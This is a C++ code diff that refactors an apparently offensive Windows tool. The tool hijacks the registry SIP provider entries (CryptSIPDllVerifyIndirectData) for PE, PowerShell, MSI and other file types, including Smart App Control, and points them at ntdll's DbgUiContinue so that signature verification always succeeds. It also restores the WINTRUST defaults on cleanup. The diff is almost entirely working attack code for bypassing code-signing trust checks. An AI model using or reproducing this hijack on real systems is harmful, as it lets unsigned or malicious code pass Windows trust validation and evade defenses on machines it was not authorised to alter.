@@ -5,6 +5,7 @@
 #include <fstream>
 #include <iostream>
 #include <string>
+#include <sstream>
 #include <vector>
 
 // Global verbose flag
@@ -88,99 +89,138 @@ bool cleanup_custom_provider(const std::wstring& guid) {
     return false;
 }
 
-bool hook_registry(bool wow64_only = false)
-{
-    if (g_verbose) std::cout << "[*] Hijacking Registry SIP Provider..." << std::endl;
-    LPCWSTR dllPath = L"C:\\Windows\\System32\\ntdll.dll";
-    LPCWSTR funcName = L"DbgUiContinue";
+// SIP entry: name + GUID
+struct SipEntry {
+    const wchar_t* name;
+    const wchar_t* guid;
+};
 
-    // 17 standard SIP GUIDs
-    const wchar_t* sips[] = {
-        L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", // PE
-        L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", // Java
-        L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", // CAB
-        L"{000C10F1-0000-0000-C000-000000000046}", // MSI
-        L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", // PowerShell
-        L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", // JScript
-        L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", // VBScript
-        L"{1A610570-38CE-11D4-A2A3-00104BD35090}", // WSF
-        L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", // AppX
-        L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", // AppXBundle
-        L"{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}", // EAppX
-        L"{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}", // EAppXBundle
-        L"{5598CFF1-68DB-4340-B57F-1CACF88C9A51}", // P7X
-        L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", // CTL
-        L"{DE351A42-8E59-11D0-8C47-00C04FC295EE}", // Flat
-        L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", // Catalog
-        L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}"  // ESD
-    };
+// 17 standard SIPs
+static const SipEntry ALL_STANDARD_SIPS[] = {
+    {L"PE",          L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}"},
+    {L"Java",        L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}"},
+    {L"CAB",         L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}"},
+    {L"MSI",         L"{000C10F1-0000-0000-C000-000000000046}"},
+    {L"PowerShell",  L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}"},
+    {L"JScript",     L"{06C9E010-38CE-11D4-A2A3-00104BD35090}"},
+    {L"VBScript",    L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}"},
+    {L"WSF",         L"{1A610570-38CE-11D4-A2A3-00104BD35090}"},
+    {L"AppX",        L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}"},
+    {L"AppXBundle",  L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}"},
+    {L"EAppX",       L"{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}"},
+    {L"EAppXBundle", L"{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}"},
+    {L"P7X",         L"{5598CFF1-68DB-4340-B57F-1CACF88C9A51}"},
+    {L"CTL",         L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}"},
+    {L"Flat",        L"{DE351A42-8E59-11D0-8C47-00C04FC295EE}"},
+    {L"Catalog",     L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}"},
+    {L"ESD",         L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}"},
+};
+static const int NUM_STANDARD_SIPS = sizeof(ALL_STANDARD_SIPS) / sizeof(ALL_STANDARD_SIPS[0]);
 
+// Default 3 SIPs (PE, PowerShell, MSI)
+static const wchar_t* DEFAULT_SIP_NAMES[] = {L"PE", L"PowerShell", L"MSI"};
+static const int NUM_DEFAULT_SIPS = 3;
+
+// Smart App Control (Win11 only)
+static const SipEntry SAC_SIP = {L"SmartAppControl", L"{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}"};
+
+// Win11-only AppX extensions
+static const SipEntry WIN11_SIP = {L"AppXExtensions", L"{1AD2DCB4-B636-4E9A-847A-AA8E0E540E93}"};
+
+// Build a filtered SIP list from a comma-separated type string
+std::vector<SipEntry> resolve_sip_types(const std::string& sip_types, bool include_sac, bool all_sips) {
+    std::vector<SipEntry> result;
+
+    if (all_sips) {
+        for (int i = 0; i < NUM_STANDARD_SIPS; i++) result.push_back(ALL_STANDARD_SIPS[i]);
+        result.push_back(SAC_SIP);
+        result.push_back(WIN11_SIP);
+        return result;
+    }
+
+    if (sip_types.empty()) {
+        // Default: PE, PowerShell, MSI
+        for (int d = 0; d < NUM_DEFAULT_SIPS; d++) {
+            for (int i = 0; i < NUM_STANDARD_SIPS; i++) {
+                if (_wcsicmp(ALL_STANDARD_SIPS[i].name, DEFAULT_SIP_NAMES[d]) == 0) {
+                    result.push_back(ALL_STANDARD_SIPS[i]);
+                    break;
+                }
+            }
+        }
+    } else if (_stricmp(sip_types.c_str(), "all") == 0) {
+        for (int i = 0; i < NUM_STANDARD_SIPS; i++) result.push_back(ALL_STANDARD_SIPS[i]);
+    } else {
+        // Parse comma-separated names
+        std::string token;
+        std::istringstream stream(sip_types);
+        while (std::getline(stream, token, ',')) {
+            // Trim whitespace
+            while (!token.empty() && token[0] == ' ') token.erase(0, 1);
+            while (!token.empty() && token.back() == ' ') token.pop_back();
+            if (token.empty()) continue;
+            std::wstring wtoken(token.begin(), token.end());
+            bool found = false;
+            for (int i = 0; i < NUM_STANDARD_SIPS; i++) {
+                if (_wcsicmp(ALL_STANDARD_SIPS[i].name, wtoken.c_str()) == 0) {
+                    result.push_back(ALL_STANDARD_SIPS[i]);
+                    found = true;
+                    break;
+                }
+            }
+            if (!found && _wcsicmp(wtoken.c_str(), L"SmartAppControl") == 0) {
+                result.push_back(SAC_SIP);
+                found = true;
+            }
+            if (!found && _wcsicmp(wtoken.c_str(), L"AppXExtensions") == 0) {
+                result.push_back(WIN11_SIP);
+                found = true;
+            }
+            if (!found) {
+                std::fprintf(stderr, "[-] Unknown SIP type: %s\n", token.c_str());
+                std::fprintf(stderr, "    Available: PE,Java,CAB,MSI,PowerShell,JScript,VBScript,WSF,AppX,AppXBundle,EAppX,EAppXBundle,P7X,CTL,Flat,Catalog,ESD,SmartAppControl,AppXExtensions\n");
+                result.clear();
+                return result;
+            }
+        }
+    }
+
+    if (include_sac) {
+        bool has_sac = false;
+        for (auto& s : result) if (wcscmp(s.guid, SAC_SIP.guid) == 0) { has_sac = true; break; }
+        if (!has_sac) result.push_back(SAC_SIP);
+    }
+
+    return result;
+}
+
+bool apply_sip_hijack(const std::vector<SipEntry>& sips, LPCWSTR dllPath, LPCWSTR funcName, bool wow64_only) {
     bool success = true;
-
-    for (const auto& guid : sips) {
+    for (const auto& sip : sips) {
         std::wstring subkey64 = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
-        subkey64 += guid;
-
+        subkey64 += sip.guid;
         std::wstring subkey32 = L"SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
-        subkey32 += guid;
-
+        subkey32 += sip.guid;
         if (!wow64_only) {
             if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey64.c_str(), dllPath, funcName, KEY_WOW64_64KEY))
                 success = false;
         }
-
         if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey32.c_str(), dllPath, funcName, KEY_WOW64_32KEY))
             success = false;
     }
-
     return success;
 }
 
-bool cleanup_registry()
+bool hook_registry(const std::vector<SipEntry>& sips, bool wow64_only = false)
+{
+    if (g_verbose) std::cout << "[*] Hijacking Registry SIP Provider..." << std::endl;
+    return apply_sip_hijack(sips, L"C:\\Windows\\System32\\ntdll.dll", L"DbgUiContinue", wow64_only);
+}
+
+bool cleanup_registry(const std::vector<SipEntry>& sips)
 {
     if (g_verbose) std::cout << "[*] Restoring Registry SIP Provider to defaults..." << std::endl;
-    // Default values for PE SIP
-    LPCWSTR dllPath = L"C:\\Windows\\System32\\WINTRUST.DLL";
-    LPCWSTR funcName = L"CryptSIPVerifyIndirectData";
-
-    // 17 standard SIP GUIDs
-    const wchar_t* sips[] = {
-        L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", // PE
-        L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", // Java
-        L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", // CAB
-        L"{000C10F1-0000-0000-C000-000000000046}", // MSI
-        L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", // PowerShell
-        L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", // JScript
-        L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", // VBScript
-        L"{1A610570-38CE-11D4-A2A3-00104BD35090}", // WSF
-        L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", // AppX
-        L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", // AppXBundle
-        L"{CF78C6DE-64A2-4799-B506-89ADFF5D16D6}", // EAppX
-        L"{D1D04F0C-9ABA-430D-B0E4-D7E96ACCE66C}", // EAppXBundle
-        L"{5598CFF1-68DB-4340-B57F-1CACF88C9A51}", // P7X
-        L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", // CTL
-        L"{DE351A42-8E59-11D0-8C47-00C04FC295EE}", // Flat
-        L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", // Catalog
-        L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}"  // ESD
-    };
-
-    bool success = true;
-
-    for (const auto& guid : sips) {
-        std::wstring subkey64 = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
-        subkey64 += guid;
-
-        std::wstring subkey32 = L"SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\";
-        subkey32 += guid;
-
-        if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey64.c_str(), dllPath, funcName, KEY_WOW64_64KEY))
-            success = false;
-
-        if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey32.c_str(), dllPath, funcName, KEY_WOW64_32KEY))
-            success = false;
-    }
-
-    return success;
+    return apply_sip_hijack(sips, L"C:\\Windows\\System32\\WINTRUST.DLL", L"CryptSIPVerifyIndirectData", false);
 }
 
 // --- Metadata Cloning ---
